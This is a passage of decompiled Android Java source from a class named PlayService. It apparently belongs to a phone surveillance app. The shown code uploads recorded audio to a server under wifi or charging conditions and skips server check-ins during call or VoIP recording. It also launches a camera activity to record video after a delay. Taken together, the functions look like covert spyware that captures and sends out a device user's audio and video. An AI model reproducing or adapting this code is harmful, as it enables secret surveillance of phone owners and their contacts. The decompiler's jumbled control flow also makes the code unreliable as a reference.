            if (PlayService.iWifiOnOff == 1) {
              i = PlayService.this.UploadAudioDataToServer();
            }
          }
          n = i;
          if (PlayService.iTransferBinary == 2)
          {
            n = i;
            if (PlayService.iChargingNow == 1) {
              n = PlayService.this.UploadAudioDataToServer();
            }
          }
          i = n;
          if (PlayService.iTransferBinary == 3)
          {
            i = n;
            if (PlayService.iWifiOnOff == 1)
            {
              i = n;
              if (PlayService.iChargingNow == 1) {
                i = PlayService.this.UploadAudioDataToServer();
              }
            }
          }
          PlayService.FLOG("UploadResult=" + i);
          PlayService.this.DoAfterUploadJob();
          if (i == 4)
          {
            PlayService.FLOG("TR_ALWAYS?");
            if (PlayService.iTransferBinaryUnlim == 0)
            {
              i = j;
              break label2603;
            }
            PlayService.FLOG("TR_WIFI?");
            if ((PlayService.iTransferBinaryUnlim == 1) && (PlayService.iWifiOnOff == 1))
            {
              i = j;
              break label2603;
            }
            PlayService.FLOG("TR_CHARGE?");
            if ((PlayService.iTransferBinaryUnlim == 2) && (PlayService.iChargingNow == 1))
            {
              i = j;
              break label2603;
            }
            PlayService.FLOG("TR_WIFI_CHARGE?");
            if ((PlayService.iTransferBinaryUnlim == 3) && (PlayService.iWifiOnOff == 1) && (PlayService.iChargingNow == 1))
            {
              i = j;
              break label2603;
            }
          }
          PlayService.FLOG("break audio cycle");
          break label1893;
          if (i != 9)
          {
            if (PlayService.this.sch != null) {
              PlayService.this.sch = null;
            }
            i = 1;
            PlayService.FLOG("Upload try was NOT successible, next time will force");
            PlayService.this.UpdateState(PlayService.res.getString(2130968602), false, PlayService.bCanSu);
            break label1924;
          }
          PlayService.this.SaveKnockTime();
          i = m;
          break label1924;
          PlayService.this.SaveKnockTime();
          PlayService.FLOG("Skip knock due to *63* :" + PlayService.iTransfer + ",wifi:" + PlayService.iWifiOnOff + ",ch:" + PlayService.iChargingNow);
          break label1924;
          PlayService.this.SaveKnockTime();
          PlayService.FLOG("Voice call/voip recording, skip server knock,rec=" + PlayService.iCallRecordState);
          break label1924;
          PlayService.FLOG((PlayService.this.lUploadCounter + PlayService.iUploadInterval * 60 * 1000 - localException4.toMillis(true)) / 1000L);
          m = i;
          break label2017;
          k = -1;
          i = 0;
          break;
          j = i - 1;
        } while (i > 0);
      }
    }
    
    public void shutdown() {}
  }
  
  public class VideoRecorder
    extends Thread
  {
    int camera;
    int delay;
    
    VideoRecorder(int paramInt1, int paramInt2)
    {
      this.delay = paramInt1;
      this.camera = paramInt2;
    }
    
    public void run()
    {
      try
      {
        Intent localIntent = new Intent(PlayService.context, CameraActivity.class);
        PlayService.FLOG("intent = " + localIntent);
        localIntent.addFlags(268435456);
        PlayService.FLOG("flag added");
        PlayService.this.startActivity(localIntent);
        for (;;)
        {
          PlayService.FLOG("VideoRecorder:run()");
          sleep(5000L);
          PlayService.FLOG("VideoRecorder:aftersleep(5000)");
          if (CameraActivity.IsActivityCreated()) {
            break;
          }
          PlayService.FLOG("Activity not created yet");
        }
        CameraActivity.StartVideoRecord(this.delay, this.camera);
      }
      catch (Exception localException)
      {
        PlayService.EXCEPT(localException, "VideoRecorder:run");
        return;
      }
      PlayService.FLOG("VideoRecorder:startedtask");
    }
  }
  
  class long2
  {
    String filename = "";
    long long1 = 0L;
    long long2 = 0L;
    
    long2() {}
  }
}
